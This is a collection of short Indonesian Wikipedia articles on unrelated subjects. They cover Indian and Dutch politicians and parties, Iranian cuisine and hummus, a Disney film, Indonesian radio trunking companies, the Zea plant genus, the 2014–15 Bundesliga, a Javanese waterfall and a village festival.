Raghubar Das (kelahiran 3 Mei 1955) adalah ketua menteri negara bagian Jharkhand saat ini di India. Ia dilantik sebagai ketua menteri negara bagian Jharkhand ke-10 pada 28 Desember 2014. Ia adalah seorang politikus India dan berasal dari Partai Bharatiya Janata. Pernah menjadi karyawan Tata Steel, ia menjabat sebagai anggota mahkamah legislatif sebanyak lima kali, mewakili Jamshedpur East sejak 1995. Ia juga menjabat sebagai Deputi Ketua Menteri dan Menteri Pengembangan Perkotaan pada masa pemerintahan yang dipimpin PBJ di negara bagian tersebut.


</doc>
<doc id="1756136" url="https://id.wikipedia.org/wiki?curid=1756136" title="Kementerian Keuangan (Belanda)">
Kementerian Keuangan (Belanda)

Kementerian Keuangan (; Fin) adalah Kementerian Belanda yang bertanggung jawab untuk Keuangan, Perpajakan, kebijakan ekonomi keuangan dan supervisi dari pasaran keuangan. Kementerian tersebut dibentuk pada 1798 dengan nama "Departemen Keuangan" dan pada 1876 menjadi "Kementerian Keuangan". Kementerian tersebut dikepalai oleh Menteri Keuangan, saat ini Jeroen Dijsselbloem.

Kementerian tersebut didirikan pada 1798. Pada sejarah awal kementerian tersebut, Perdana Menteri sering menjabat sebagai Menteri Keuangan. Pieter Philip van Bosse menjabat sebagai Menteri Keuangan sebanyak lima kali. Sejak 1965, Sekretaris Negara dilantik pada masing-masing pembentukan dengan tanggung jawab untuk perpajakan. Perdana Menteri paling terkini menjabat sebagai Menteri Keuangan adalah Jelle Zijlstra (1966–67).

Kementerian tersebut sekarang dikepalai oleh satu menteri dan satu Sekretaris Negara. Kantor utama kementerian tersebut terletak di pusat Den Haag di Korte Voorhou. Kementerian tersebut memiliki 1,500 pelayan sipil. Pelayanan sipilnya dikepalai oleh seorang sekretaris jenderal dan deputi sekretaris jenderal

"Untuk daftar lengkap, lihat ." 



</doc>
<doc id="1756141" url="https://id.wikipedia.org/wiki?curid=1756141" title="Hidangan Iran">
Hidangan Iran

Masakan Iran atau Masakan Persia () adalah gaya kuliner tradisional ataupun modern yang berasal dari negara Iran (dulu lebih dikenal sebagai Persia). Terletak di Timur Tengah dan Asia Barat, seni kuliner Iran adalah unik, karena memiliki sejarah yang panjang, serta saling mempengaruhi dengan kebudayaan di kawasan sekitarnya yang pernah ditaklukan oleh Kekaisaran Persia. Secara khusus seni kuliner Iran memiliki hubungan dan saling mempengaruhi dengan beberapa seni kuliner sekitar, seperti Azerbaijan, Turki, kaukasus, Kurdi, Irak, Levant, Yunani, Masakan Asia Tengah, dan sedikit dengan Rusia.

Masakan Persia memiliki kemiripan, hubungan dekat, dan saling memengaruhi dengan masakan Turki, Kaukasus, dan Azerbaijan, karena faktor kedekatan geografis, kekerabatan etnik (suku bangsa Azerbaijan adalah suku terbesar kedua di Iran setelah bangsa Persia). Aspek sejarah juga memengaruhi, karena kawasan ini pernah dipersatukan oleh kekaisaran tertentu, seperti Achaemenid, Sassaniah, Seljuk, Safawiyah, Afsharid, Utsmaniyah dan Qajar.

Sayur-sayuran segar dan rempah banyak digunakan dalam hidangan Iran, termasuk buah-buahan seperti anggur, plum, delima, quince, prun, aprikot, dan kismis. Masakan khas Persia biasanya merupakan kombinasi dari nasi dan daging, seperti daging kambing, daging ayam, atau ikan, dan sayuran, seperti bawang bombay, berbagai jenis rempah, dan kacang-kacangan. Untuk mencapai citarasa yang seimbang, bumbu rempah ditambahkan, seperti saffron, limau kering, kayu manis, dan daun parsley, semuanya dicampur secara teliti.

Masakan Iran memiliki variasi yang kaya; termasuk chelow kabab (nasi disajikan dengan daging panggang: "barg", "koobideh", "joojeh", "shishleek", "soltani", "chenjeh"), "khoresh" (semacam semur daging disajikan dengan nasi Irani: "ghormeh sabzi", "gheimeh", "fesenjān", dan lain-lain), "āsh" (Sup kental: misalnya āsh-e anār), "kuku" (souffle sayuran), "polo" (nasi putih disajikan terpisah atau dicampur dengan daging, sayuran, dan rempah, termasuk "loobia polo", "albaloo polo", "sabzi polo", "zereshk polo", "baghali polo", dan lainnya), termasuk berbagai jenis salad, roti, kue, dan minuman yang spesifik pada beberapa daerah di Iran. Terdapat banyak pula jenis kudapan, makanan pembuka, dan makanan pencuci mulut khas Iran.


</doc>
<doc id="1756144" url="https://id.wikipedia.org/wiki?curid=1756144" title="Home on the Range (film 2004)">
Home on the Range (film 2004)

Home on the Range adalah sebuah film komedi barat musikal animasi Amerika 2004 yang diproduksi oleh Walt Disney Feature Animation dan dirilis oleh Walt Disney Pictures pada 2 April 2004, dan dinamai dari nama lagu country populer "Home on the Range". Sebagai film fitur ke-45 di Walt Disney Animated Classics, film tersebut adalah film animasi tradisional Disney terakhir sampai "The Princess and the Frog" yang dirilis pada 2009.


Home on the Range: An Original Walt Disney Records Soundtrack adalah soundtrack dari film fitur animasi 2004 Disney "Home on the Range". Soundtrack tersebut berisi musik yang ditulis oleh Alan Menken dan Glenn Slater, dan lagu-lagu vokalnya ditampilkan oleh k.d. lang, Randy Quaid, Bonnie Raitt, Tim McGraw, dan The Beu Sisters bersama dengan skor film yang dikomposisikan oleh Alan Menken. Album tersebut dirilis pada 30 Maret 2004 oleh Walt Disney Records.




</doc>
<doc id="1756366" url="https://id.wikipedia.org/wiki?curid=1756366" title="Partai Rakyat Katolik">
Partai Rakyat Katolik

Partai Rakyat Katolik (, KVP) adalah sebuah partai politik demokratik Kristen Katolik di Belanda. Pada masa kehadirannya, partai tersebut berada dalam pemerintahan. Partai tersebut adalah salah satu dari pendahulu Christian Democratic Appeal (CDA), di mana partai tersebut digabung pada 1980.

KVP didirikan pada 22 Desember 1945. Partai tersebut adalah kelanjutan dari Partai Negara Katolik Roma (PNKR) pada masa sebelum Perang Dunia II. Tidak seperti PNKR, KVP terbuka untuk orang-orang dari seluruh denominasi, namun umumnya orang Katolik yang mendukung pertai tersebut. Partai tersebut lebih progresif dan lebih berwajah modern ketimbang pendahulunya image than its predecessor.

Sebagai sebuah partai Kristen, KVP memiliki hubungan yang kuat dengan partai Protestan konservatif PAR dan Serikat Sejarah Kristen. Hubungan yang kuat tersebut dihasilkan dalam beberapa kabinet pada periode 1946-1977 dan pembentukan Christen-Democratisch Appèl, di mana tiga partai tersebut disatukan pada 1974.

KVP memiliki sebuah kelompok tengah-kiri yang kuat pada peringkatnya. Kelompok tersebut didukung dengan kerjasama dari partai sosial-demokratik PvdA. Dukungan tersebut dihasilkan dalam beberapa kabinet dengan PvdA

Sebagai partai dari minoritas Katolik di negara yang didominasi Protestan, KVP menjalin hubungan dengan Partai Tengah Jerman, yang telah ada sebelum Perang Dunia Kedua dan Partai Rakyat Demokratik Kristen Swiss. Posisi politik dan agenda-nya sama dengan partai demokratik Kristen Katolik lainnya di Eropa, seperti partai Christen-Democratisch en Vlaams Flemish dan Demokrasi Kristen Italia.



</doc>
<doc id="1756369" url="https://id.wikipedia.org/wiki?curid=1756369" title="Mobilkom Telekomindo">
Mobilkom Telekomindo

Mobilkom Telekomindo adalah sebuah perusahaan yang bergerak di bidang jasa teleponi dengan perangkat radio trunking asal Indonesia. Perusahaan ini dibangun secara patungan oleh (joint venture) oleh PT Telekomindo Primabhakti, PT Inka Forindo Jaya, PT Mitralindo Perdana, Jasmine International, International Wireless Communication dan Goldman Sachs. Perusahaan ini pertama kali dibangun pada tahun 1993.

Mobilkom beroperasi di pita frekuensi 400 MHz dan 800 MHz (VHF & UHF). Cakupan wilayah yang telah masuk ke dalam layanan Mobilkom termasuk Jabodetabek, Semarang, dan Surabaya dengan 23 radio base stations (RBS). Hingga pada tahun 2015, perusahaan ini telah melayani sekitar 350 pelanggan (sekitar 5000 pengguna) yang terdiri dari sektor perusahaan atau lembaga negeri dan swasta. Alamat Mobilkom terletak di Graha Mobilkom Jl. Raden Saleh Raya No. 64 - 66, Jakarta.

Berdasarkan Keputusan Menteri Komunikasi dan Informatika Nomor : 436/KEP/M.KOMINFO/10/2007 tentang Izin Penyelenggaraan Jaringan Bergerak Terestrial Radio Trunking PT. Mobilkom Telekomindo, perusahaan ini dapat beroperasi di pita frekuensi 419 – 422.5 MHz berpasangan dengan 426.25 – 429.75 MHz. Selain itu Mobilkom juga mendapatkan lisensi untuk bergerak di frkuensi 800 MHz melalui surat 327/IV.1.2/DITFREK/X/2002.

Pada tahun 1995 bekerjasama dengan Motorola untuk menjadi distributor resmi produk perangkat komunikasi radio dua arah. Baru pada tahun 2002 bergerak secara resmi mengembangkan industri radio trunking untuk produk, terminal, dan infrastruktur yang produsennya berasal dari Motorola.

Beberapa perusahaan yang telah menggunakan jasa telepon radio trunking di antaranya adalah Pertamina (1996) untuk wilayah Tanjung Gerem,Jakarta, Bogor, Bandung, dan Cirebon. Pada tahun 2003 memenangkan tender perawatan radio trunking untuk PT. Caltex Pacific Indonesia.


</doc>
<doc id="1756370" url="https://id.wikipedia.org/wiki?curid=1756370" title="Zea">
Zea

Zea adalah marga (genus) tumbuhan yang termasuk dalam suku rumput-rumputan (Poaceae). Anggota yang paling dikenal dan menjadi spesies tipe adalah jagung ("Z. mays"), yang merupakan salah satu tanaman penghasil pangan utama bagi umat manusia. Selain "Z. mays", dikenal ada empat jenis (spesies) anggota "Zea" lainnya. Semuanya berasal dari Mesoamerika.

Ada lima jenis yang menjadi anggota marga "Zea": "Zea diploperennis", "Zea perennis", "Zea luxurians", "Zea nicaraguensis", dan "Zea mays". Empat jenis pertama dikelompokkan dalam seksi "Luxuriantes" dan yang terakhir dalam seksi "Zea". "Z. mays" terbagi menjadi empat anakjenis (subspesies): "Z. mays" ssp. "huehuetenangensis", ssp. "mexicana", ssp. "parviglumis", dan ssp. "mays". Tiga anakjenis pertama biasa dikenal sebagai teosinte dan yang terakhir adalah jagung, yang luas dibudidayakan. Kedua seksi ini dibedakan dari banyaknya knob yang ditemukan pada kromosom mereka.


</doc>
<doc id="1756371" url="https://id.wikipedia.org/wiki?curid=1756371" title="Maesa Nusatama">
Maesa Nusatama

Maesa Nusatama adalah perusahaan yang bergerak di bidang jasa komunikasi melalui perangkat radio untuk keperluan operasional lapangan asal Indonesia. Dengan kata lain, perusahaan ini menyediakan jasa telepon radio trunking. Produk perusahaan ini berjalan pada frekuensi 800 MHz. Perangkat yang dimiliki oleh Maesa merupakan buatan Motorola dari Amerika Serikat. Pertama kali berdiri pada tahun 1992, Maesa ditaksir sebagai pelopor Jasa Radio Trunking Nasional di Indonesia dengan jangkauan Jabodetabek, Bali, Surabaya, Cirebon, Bandung, dan Balikpapan. Produknya acap kali digunakan untuk keperluan lokasi seperti pertambangan, perkantoran, kilang minyak, dan lain-lain. Kantor pusat perusahaan ini terletak di Menara Dea lt. 3 Suite 303 Kawasan Mega Kuningan, Jl. Mega Kuningan Barat Kav. 4.3 No. 1 Jakarta.

Maesa sendiri merupakan perusahaan patungan dari para pebisnis seperti Theo M.P. Rarumangkay, Alex Evert Kawilarang, Gregorius Kosasie, Erik Boy Kosasie dan lembaga seperti Yayasan Serangan Umum 1 Maret dan Bimantara Group.


</doc>
<doc id="1756379" url="https://id.wikipedia.org/wiki?curid=1756379" title="Bundesliga 2014–2015">
Bundesliga 2014–2015

Bundesliga 2014–15 merupakan edisi ke-52 dari Bundesliga, liga utama sepak bola Jerman. Liga musim ini dimulai pada tanggal 22 Agustus 2014 dan pertandingan terakhir dilaksanakan pada 23 Mei 2015.

Bayern Munich adalah juara bertahan setelah memenangi gelar juara liga musim 2013–14, dan kembali menjadi juara pada musim ini.
Secara keseluruhan, liga diikuti oleh 18 klub, terdiri atas 15 klub peserta Bundesliga 2013–14 dan dua klub promosi dari 2. Bundesliga 2013–14 yaitu 1. FC Köln dan SC Paderborn 07 serta Hamburger SV yang memenangkan playoff degradasi melawan SpVgg Greuther Fürth.



 

Klub peringkat enam belas, akan menghadapi klub peringkat tiga pada 2. Bundesliga 2014–15 akan bertanding dalam dua pertandingan kandang tandang untuk menentukan siapa yang akan mengikuti Bundesliga 2014–15. Hamburger SV menghadapi play off untuk yang kedua kalinya secara berurutan, untuk menghadapi kemungkinan degradasi pertama klub tersebut untuk pertama kali sepanjang sejarah klub.

"Hamburger SV lolos dengan skor agregat 3–2."

 


</doc>
<doc id="1756381" url="https://id.wikipedia.org/wiki?curid=1756381" title="Alexandria Realtindo">
Alexandria Realtindo

PT Alexandria Realtindo berdiri pada tahun 2003 di kota Tasikmalaya, Jawa Barat. Perusahaan yang berfokus pada bisnis properti ini beralamat di Jl. Yudanegara, No. 15. PT Alexandria Realtindo merupakan salah satu perusahaan Developer terbesar di Priangan Timur.

Salah satu ciri dari produk Perumahan PT Alexandria Realtindo adalah memiliki konsep Go Green yang concern pada masalah lingkungan hidup dan penghijauan.

Berikut adalah beberapa produk properti perumahan yang dibangun oleh PT Alexandria Realtindo, diantanya:




</doc>
<doc id="1756384" url="https://id.wikipedia.org/wiki?curid=1756384" title="Darmadi Durianto">
Darmadi Durianto

Darmadi Durianto (Liem Tek Tjoen), atau akrab dipanggil dengan inisial DD, , adalah seorang Anggota DPR RI Periode 2014-2019 sekaligus Politisi Partai Demokrasi Indonesia Perjuangan yang lahir di Kabupaten Mempawah, Provinsi Kalimantan Barat, Indonesia pada tanggal 25 Juni 1967. berasal dari suku Tionghoa 

Ia meraih gelar sarjana Ekonomi dari Fakultas Ekonomi Unika Atma Jaya, Jakarta pada 1989 dan gelar MBA dari University of Manila, Filipina pada 1993.

Selain aktif sebagai pengajar program Magister Manajemen (MM) IBII serta Unika Atma Jaya untuk mata kuliah Pemasaran, "Strategic Marketing, Internasional Marketing, Advertising", dan Perilaku Konsumen, ia juga menjadi konsultan pemasaran di beberapa perusahaan nasional maupun multinasional.

Belakangan ini, namanya diperhitungkan sebagai konsultan pemasaran yang handal. Ia sering menjadi narasumber dan menulis di majalah SWA, talk show di radio Trijaya FM, dan stasiun Indovision serta memberikan seminar dan pelatihan tentang marketing di berbagai daerah. Pengalaman bisnis dimulai dari level supervisor sampai ke "top level" di berbagai perusahaan. Saat ini, ia menjabat sebagai Marketing Director PT. Hasbumindo Internasional serta menjalankan "Infinity Consulting".

Dari hobinya terhadap politik ia mulai menemui jaringan di kampus tempatnya mengajardan akhirnya bersahabat dengan aktivis PDIP.



Pada Pileg tahun 2014 lalu Darmadi Durianto terpilih sebagai anggota DPR RI dengan memperoleh 52.861 suara Saat ini Darmadi Durianto bertugas di Komisi VI DPR RI membidangi urusan BUMN, Perdagangan, Perindustrian dan UKM koperasi

Ia menikah dengan Felicya Tjioe.


</doc>
<doc id="1756396" url="https://id.wikipedia.org/wiki?curid=1756396" title="Noin Bullet">
Noin Bullet

Noin Bullet adalah sebuah band ska asal Bandung, Indonesia. Grup band ini telah melahirkan dua buah album yaitu Bebas dan Manusia, keduanya di bawah label Warner Music. Lagu hits yang terkenal adalah Bebas, Bakakak Hayam, You Know Me, Kita bukan Pecundang.




</doc>
<doc id="1756397" url="https://id.wikipedia.org/wiki?curid=1756397" title="Taman Negara Tanah Lembap Kuching">
Taman Negara Tanah Lembap Kuching

Taman Negara Tanah Lembap Kuching (Inggris: "Kuching Wetlands National Park", Indonesia: Taman Nasional Lahan Basah Kuching) adalah sebuah taman nasional di Malaysia. Ia adalah bagian tersisa dari Hutan Simpan Bakau Sarawak ("Sarawak Mangrove Forest Reserve") yang terdahulu, yang meliputi kawasan seluas 170 km2.

Terletak 30 km dari Kuching, Taman Negara Tanah Lembap ini dimuat di berita negara pada tahun 1992, dan meliputi kawasan seluas 66,1 km hingga muara laut Sibu dan Sungai Salak. Taman nasional ini melingkupi wilayah pantai, laut, dan ekosistem air tawar.


Beavitt, W. & Tuen.A.A (2010). Swamp - Kuching Wetlands National Park. UNIMAS: Kuching. pp. 112. Sarawak, Malaysia, Borneo, William Beavitt & Dr Andrew Alek Tuen.



</doc>
<doc id="1756402" url="https://id.wikipedia.org/wiki?curid=1756402" title="Ar-Raqqah">
Ar-Raqqah

Ar-Raqqah merupakan sebuah kota di Suriah. Kota ini letaknya di bagian utara. Tepatnya di Gubernurat Ar-Raqqah. Pada tahun 2004, kota ini memiliki jumlah penduduk sebesar 220.268 jiwa dan memiliki luas wilayah 1.962 km².

Kota ini memiliki angka kepadatan penduduk sebesar 110 jiwa/km². Pada tahun 2014, kota ini resmi dikuasai oleh Negara Islam Irak dan Syam.



</doc>
<doc id="1756576" url="https://id.wikipedia.org/wiki?curid=1756576" title="Penas Kalimalang (Transjakarta)">
Penas Kalimalang (Transjakarta)

Penas Kalimalang adalah sebuah stasiun BRT Transjakarta yang terletak di Jalan Mayjen DI Pandjaitan, Cipinang Cempedak, Jatinegara, Jakarta Timur. Stasiun BRT ini berada di Koridor 10 yang membentang dari utara ke selatan Jakarta.



</doc>
<doc id="1756579" url="https://id.wikipedia.org/wiki?curid=1756579" title="Daftar Pengurus APJII Periode 2009 - 2012">
Daftar Pengurus APJII Periode 2009 - 2012

APJII atau Asosiasi Penyelenggara Jasa Internet Indonesia adalah asosiasi yang terbentuk pada Musyawarah Nasional Pertama tanggal 15 Mei 1996. Dewan pengurus yang ditunjuk dengan masa jabatan 3 tahun bertugas melakukan beberapa program strategis untuk pengembangan jaringan Internet di Indonesia. Berikut daftar susunan pengurus periode 2009 - 2012.

DEWAN PENGURUS

DEWAN PENGAWAS




</doc>
<doc id="1756580" url="https://id.wikipedia.org/wiki?curid=1756580" title="Daftar Pengurus APJII Periode 2015 - 2018">
Daftar Pengurus APJII Periode 2015 - 2018

APJII atau Asosiasi Penyelenggara Jasa Internet Indonesia adalah asosiasi yang terbentuk pada Musyawarah Nasional Pertama tanggal 15 Mei 1996. Dewan pengurus yang ditunjuk dengan masa jabatan 3 tahun bertugas melakukan beberapa program strategis untuk pengembangan jaringan Internet di Indonesia. Berikut daftar susunan pengurus periode 2015 - 2018.

DEWAN PENGURUS

DEWAN PENGAWAS




</doc>
<doc id="1756581" url="https://id.wikipedia.org/wiki?curid=1756581" title="Cipinang Kebon Nanas (Transjakarta)">
Cipinang Kebon Nanas (Transjakarta)

Cipinang Kebon Nanas adalah sebuah stasiun BRT Transjakarta yang terletak di Jalan Mayjen DI Pandjaitan, Cipinang Besar Selatan, Jatinegara, Jakarta Timur. Stasiun BRT ini berada di Koridor 10 yang membentang dari utara ke selatan Jakarta.




</doc>
<doc id="1756583" url="https://id.wikipedia.org/wiki?curid=1756583" title="Hummus">
Hummus

Hummus (, ; ) adalah hidangan khas Levant (Negeri Syam) berupa pure, bubur, saus cocol, atau semacam selai gurih yang dibuat dari kacang Arab giling yang dicampur tahini (wijen giling), minyak zaitun, sari perasan limau, garam dan bawang putih. Kini hidangan ini populer di seantero Timur Tengah, termasuk Turki, dan Afrika Utara.

Makanan ini lazimnya dimakan dengan Roti.

Hummus (حمّص "ḥummuṣ") adalah istilah dalam Bahasa Arab yang berarti "kacang Arab", dan nama lengkap selai atau pasta ini adalah "ḥummuṣ bi ṭaḥīna," yang berarti "kacang Arab dan tahini".

Banyak catatan sejarah terkait masakan menggambarkan hummus sebagai makanan purba, dan dihubungkan dengan tokoh bersejarah, seperti Salahuddin. Memang, bahan dasarnya, kacang Arab, wijen, lemon, dan bawang putih — telah dikonsumsi lebih dari seribu tahun.

Akan tetapi kenyataannya, tidak ada bukti spesifik mengenai "hummus bi tahina." Meskipun kacang Arab dikonsumsi secara luas di kawasan ini, kacang ini lazim dimasak dalam semacam semur atau sayur berkuah yang panas, bubur kacang Arab yang dimakan dingin-dingin dengan tahini belum muncul hingga zaman kekhalifahan Abbasiyah di Mesir dan Syam.

Resep masakan yang paling mirip "hummus bi tahina" adalah buku resep masakan yang diterbitkan di Kairo pada abad ke-13. Pure atau bubur kacang Arab dingin dengan cuka dan acar limau, dengan herba, rempah, dan minyak, akan tetapi tidak ada tahini atau bawang putih muncul dalam "Kitāb al-Wusla ilā l-habīb fī wasf al-tayyibāt wa-l-tīb"; dan pure kacang Arab dan tahini disebut "hummus kasa" disebut dalam "Kitab Wasf al-Atima al-Mutada": berdasarkan pada bubur kacang Arab dan tahini, diasamkan dengan cuka (tidak dengan perasan jeruk nipis atau limau), akan tetapi mengandung banyak herba, rempah, dan kacang-kacangan, tetapi tanpa bawang putih. Cara penyajiannya juga dengan memipihkannya hingga gepeng dan membiarkannya semalaman, hal ini mungkin memberikan tekstur yang berbeda dari "hummus bi tahina".



</doc>
<doc id="1756591" url="https://id.wikipedia.org/wiki?curid=1756591" title="SMK Negeri 1 Takeran">
SMK Negeri 1 Takeran

SMK Negeri Takeran, merupakan salah satu Sekolah Menengah Kejuruan Negeri yang ada di Kabupaten Magetan, Jawa Timur, yang beralamat di Desa Kuwonharjo, Kecamatan Takeran, Kabupaten Magetan, Jawa Timur.

SMKN Taeran Memiliki beberapa Program Keahlian, yaitu




</doc>
<doc id="1756598" url="https://id.wikipedia.org/wiki?curid=1756598" title="Rainforest World Music Festival">
Rainforest World Music Festival

Rainforest World Music Festival (RWMF), atau Festival Musik Hutan Hujan Dunia, adalah festival musik tiga hari tahunan untuk merayakan keberagaman musik dunia, yang diselenggarakan di Kuching, Sarawak, Malaysia, dengan lokakarya, pertunjukan budaya, pameran kerajinan, dan kios makanan di siang hari, serta konser di panggung utama pada malam hari. Ia saat ini merupakan perhelatan musik terbesar di Malaysia dengan total pengunjung selama akhir minggu mendekati 30.000 orang.

Festival ini menampilkan beragam jenis musik, mulai dari musik tradisional, fusion, dan kontemporer dunia. Festival menekankan pada pemakaian alat musik tradisional dunia, meskipun alat musik elektrik sebagai pendamping juga biasa digunakan. Para peserta berasal dari Sarawak, wilayah Malaysia lainnya, serta negara-negara lainnya. Para artis yang pernah tampil antara lain: Joey Ayala (Filipina - 1998), Shooglenifty (Skotlandia - 1999), Inka Marka (Amerika Selatan - 2000), Rajery (Madagaskar - 2001), Black Umfolosi (Zimbabwe - 2002), Huun Huur Tu (Tuva), Cynthia Alexander (Philippines) - 2003), Te Vaka (Samoa/Selandia Baru - 2004), Namgar (Mongolia - 2005), Shannon (Polandia - 2005, 2007), Peatbog Faeries (Skotlandia - 2006), Tarika Be (Madagaskar - 2007), Ross Daly (Yunani - 2008) dan Blackbeard's Tea Party (Inggris - 2014).



</doc>
<doc id="1756605" url="https://id.wikipedia.org/wiki?curid=1756605" title="Air Terjun Silancur">
Air Terjun Silancur

Air Terjun Silancur adalah air terjun dengan ketinggian 25 meter yang terletak di Cagar Alam Nasional Geologi Karangsambung. Air Terjun Silancur mempunyai daya tarik tersendiri, karena lingkungan masih betul-betul alami. Kesunyian juga masih sangat terasa, sebab belum banyak pelancong yang datang menikmati keindahan alamnya sehingga bisa dikatakan masih tersembunyi. Udara di sekitarnya sejuk dan sepanjang jalan menuju ke sana terdapat area perkebunan yang asri. Banyak dijumpai terasering sawah warga yang sangat cantik serta pohon pinus yang rindang. Air Terjun Silancur terlihat membentuk sebuah garis putih tinggi menjulang. Bersamaan, terdengar suara gemericik air. Tidak seperti air terjun pada umumnya yang memiliki penampungan air di bawahnya, aliran Air Terjun Silancur itu jatuh menghantam batuan besar hingga menghasilkan percikan air yang segar. Jika terik matahari dalam keadaan sempurna, percikan air yang terbawa angin terlihat berwarna-warni seperti pelangi. Air Terjun Silancur berada di lereng perbukitan di ketinggian 220 mdpl.

Air Terjun Silancur terletak di Desa Desa Wadasmalang, Kecamatan Karangsambung, Kabupaten Kebumen. Kondisi jalan menuju Air Terjun Silancur sudah relatif mulus dengan aspal hotmix. Namun untuk menjangkau air terjun harus berjalan kaki melewati lerengan perbukitan yang terjal sejauh 400 meter.. Di sekitar air terjun tak ada fasilitas apapun, hanya lahan parkir swadaya masyarakat di pinggir jalan raya. Selama perjalanan ke air terjun banyak dijumpai sungai-sungai kecil denga air jernih mengalir, bisa mengundang untuk turun sejenak merasakan sejuk dan jernihnya air pegunungan.

Untuk menjangkau Air Terjun Silancur rute yang dilewati untuk menuju tempat ini adalah dari Kota Kebumen – Krakal (Alian) – Wadasmalang. Selepas pasar Krakal lanjutkan ke utara mengikuti jalan raya. Kemudian akan ada pertigaan dan ambil jalur kiri. Ikuti saja jalan raya tersebut hingga menemukan Pasar Wadasmalang. Berikutnya lanjutkan terus mengikuti jalan raya hingga menemukan belokan dengan tebing batu di kanan jalan. Dari sini perjalanan dilanjutkan dengan berjalan kaki menuruni jurang di kiri jalan. Tak ada kendaraan umum yang melewati Air Terjun Silancur sehingga dianjurkan untuk menggunakan kendaraan pribadi terutama sepeda motor.


</doc>
<doc id="1756620" url="https://id.wikipedia.org/wiki?curid=1756620" title="Festival Jondang">
Festival Jondang

Festival Jondang atau masyarakat desa Kawak menyebutnya Jondang Kawak adalah suatu tradisi yang terdapat di Desa Kawak, Kecamatan Pakis Aji, Kabupaten Jepara. Festival Jondang tersebut merupakan rangkaian acara sedekah bumi yang dilakukan setiap tahun. Sebelumnya juga dilaksanakan tradisi gogo lele dan sepak bola api. “Setelah arak-arakan hasil bumi dan jondang itu, dilaksanakan prosesi doa bersama, selain itu diharapkan mendapatkan berkah juga semakin mengeratkan kerukunan antar warga desa. Festival Jondang rutin digelar setiap Kamis Kliwon bulan Dzulhijjah penanggalan Hijriyah, atau bulan Besar penanggalan Jawa.

Asal nama Festival Jondang, Kata ""Jondang"" merupakan singkatan jodone ngandang (jodoh datang). Jondang adalah alat yang dijadikan tempat untuk barang-barang yang dibawa saat lamaran yang diberikan kepada calon pengantin wanita. Jadi, Festival Jondang adalah Mengantar jondang yang berisi makanan dan hasil bumi merupakan tradisi lamaran jejaka terhadap seorang gadis.

Festival Jondang yang merupakan ungkapan syukur, semoga rezeki dan segala kebaikan akan ngandang (datang). Dengan adanya Festival Jondang tersebut, masyarakat Desa Kawak yang sudah saatnya menikah tidak menemui kesulitan mendapatkan jodoh. Itu diyakini merupakan berkah yang didapatkan dari pelestarian budaya leluhur, Tentu saja atas izin Allah SWT.

Festival Jondang diadakan dalam rangka acara sedekah bumi Desa Kawak. Festival Jondang diikuti oleh seluruh RT (Rukun Tetangga) yang ada. Adapun festival jondang ini dengan cara menghias jondang dengan hasil bumi dari masyarakat desa kawak sebagai rasa syukur kepada sang pencipta atas hasil bumi.

Prosesi Festival Jondang ini dilakukan dengan cara mengarak jondang yang diisidengan hasil bumi warga, serta dibentuk dengan berbagai macam bentuk yang unik. Seperti dibentuk gundukan, dibentuk berbagaijenis binatang, hiasan hingga almari seperti layaknya saat masyarakat melakukan aktivitas melamarjodohnya.Berbagai jenis hasil bumi yang diangkut menggunakanjondang tersebut diarak dari Balai Desa Kawak hingga ke punden yang berada di kawasan masjid Wali. Jaraknya sekitar dua kilometer. Kelompok yang mengikuti Festival Jondang ada sekitar 25 kelompok. Mereka terdiri dari perwakilan RT masing-masing dan lembaga yang ada di Desa Kawak.

Festival jondang diikuti 21 RT, juga didukung lembaga pendidikan, TK, Sekolah Dasar dan Madrasah Dinniyah.

Semua peserta Festival Jondang berkumpul di Balai desa sebelum diarak masyarakat terlebih dahulu disuguhi oleh kesenian-kesenian tradisional. seteleh itu baru satu persatu peserta mengarak kreasi jondang ke punden Mbah Kawak. Arak-arakan Festival Jondang dari Balai Desa menuju Masjid Wali, yang berjarak kurang lebih 500 meter. Kemeriahan ada saat prosesi mengarak jondang yang dimulai dari lapangan balai desa hingga jalan menuju punden.dengan kreasi festival Jondang semakin hari semakin tambah ramai dan telah tercipta kreasi-kreasi unik dari jondang yang di buat di masing-masing RT yang ada di Desa Kawak.



</doc>
<doc id="1756629" url="https://id.wikipedia.org/wiki?curid=1756629" title="Jayalalithaa">
Jayalalithaa

Jayalalithaa Jayaram (; ), yang umumnya disebut sebagai Jayalalithaa, Jaya atau Amma (diterjemahkan menjadi ibu dalam bahasa Indonesia), adalah seorang politikus India dan Ketua Menteri Tamil Nadu saat ini. Ia bekerja sebagai aktris sebelum ia masuk ke politik dan tampil dalam lebih dari 120 film Tamil, Telugu, dan Kannada. Ia adalah sekretaris jenderal All India Anna Dravida Munnetra Kazhagam (AIADMK). Ia lebih dikenal sebagai "Puratchi Thalaivi" (Pemimpin Revolusioner) oleh para pengikutnya.

Sebagai aktris, ia kemudian bekerja dengan aktor yang menjadi politikus lainnya, M. G. Ramachandran (MGR). Hal tersebut membuat terjadinya spekulasi bahwa Jayalalithaa dikenalkan politik oleh MGR. Namun, ia membantah klaim tersebut dan menyatakan bahwa ia masuk politik karena pilihan. Ia adalah anggota Rajya Sabha yang terpilih dari Tamil Nadu, dari 1984 sampai 1989. Setelah kematian MGR, Jayalalithaa memproklamasikan dirinya sebagai pewaris politiknya. Ia adalah ketua menteri perempuan Tamil Nadu kedua setelah Janaki Ramachandran.

Jayalalithaa lahir pada 24 Februari 1948, di Melukote, di Pandavapura taluk di distrik Mandya, Negara Bagian Mysore (sekarang Karnataka) dari pasangan Jayaram dan Vedavalli dalam sebuah keluarga Brahmin pemakai bahasa Tamil. Kakeknya bertugas di kekaisaran Mysore sebagai seorang dokter bedah, dan mendapatkan gelar 'Jaya' ('kemenangan') yang ditambahkan ke nama-nama berbagai anggota keluarganya untuk menunjukan keterikatan mereka dengan Maharaja Jayachamarajendra Wadiyar dari Mysore. Ibunya menyebutnya Komalavalli.

Ayah Jayalalithaa meninggal ketika ia berusia dua tahun. Ibunya kemudian berpindah ke Bangalore, di mana orangtuanya tinggal dengan Jayalalithaa. Ibunya kemudian mulai berkarya sebagai seorang aktris dalam sinema Tamil, yang berbasis di Chennai, yang membuatnya memiliki nama panggung yakni Sandhya. Ketika masih di Bangalore, Jayalalithaa masuk Bishop Cotton Girls' School. Ia menyelesaikan pendidikan masa kecilnya di Sacred Heart Matriculation School (yang lebih dikenal sebagai Church Park Presentation Convent atau Presentation Church Park Convent) di Chennai. Ia mendapatkan beasiswa pemerintah untuk pendidikan lebih lanjut. Ia dapat berbicara dalam beberapa bahasa, yakni Telugu, Tamil, Kannada, Hindi, Malayalam dan Inggris.

